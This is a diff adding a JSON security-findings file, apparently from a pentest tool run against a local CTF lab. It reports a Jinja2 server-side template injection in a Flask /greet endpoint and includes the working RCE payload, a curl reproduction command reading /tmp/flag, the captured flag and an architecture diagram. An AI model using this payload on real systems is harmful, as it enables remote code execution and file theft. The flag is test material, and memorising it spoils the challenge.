@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:57:12.124281+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "205ee089-e3b3-4a37-86c1-fd84621c9d8c",
+      "timestamp": "2026-04-12T22:57:12.124166+00:00",
+      "title": "Server-Side Template Injection (SSTI) \u2014 RCE via Jinja2",
+      "severity": "critical",
+      "target": "http://172.17.0.1:33977/greet?name=",
+      "description": "The /greet endpoint passes the 'name' GET parameter directly into a Jinja2 template without sanitization. An attacker can inject arbitrary Jinja2 expressions, escalating to full Remote Code Execution via Python's os.popen(). The flag was extracted from /tmp/flag on the server.",
+      "evidence": "GET /greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /tmp/flag').read()}}\n\nResponse: Hello, flag{5e88d1bf-228f-4335-a4da-96517cb69114}\n\nCTF FLAG: flag{5e88d1bf-228f-4335-a4da-96517cb69114}",
+      "tool_used": "http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl \"http://172.17.0.1:33977/greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /tmp/flag').read()}}\"",
+        "expected": "Hello, flag{5e88d1bf-228f-4335-a4da-96517cb69114}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "dea6523b-0008-4448-93bf-e309cfffe127",
+      "timestamp": "2026-04-12T22:57:21.112404+00:00",
+      "title": "Application Architecture \u2014 SSTI Demo (CTF)",
+      "mermaid": "flowchart TD\n  Attacker[\"Attacker\"] --> GrpEndpoint[\"GET /greet?name= (Jinja2 SSTI)\"]\n  GrpEndpoint --> FlaskApp[\"Flask App (Werkzeug 3.0.3 / Python 3.9.25)\"]\n  FlaskApp --> Jinja2[\"Jinja2 Template Engine\"]\n  Jinja2 --> OSPopen[\"os.popen() RCE\"]\n  OSPopen --> FS[\"/tmp/flag (CTF flag)\"]\n  FlaskApp --> HomeEndpoint[\"GET / (form page)\"]"
+    }
+  ]
+}
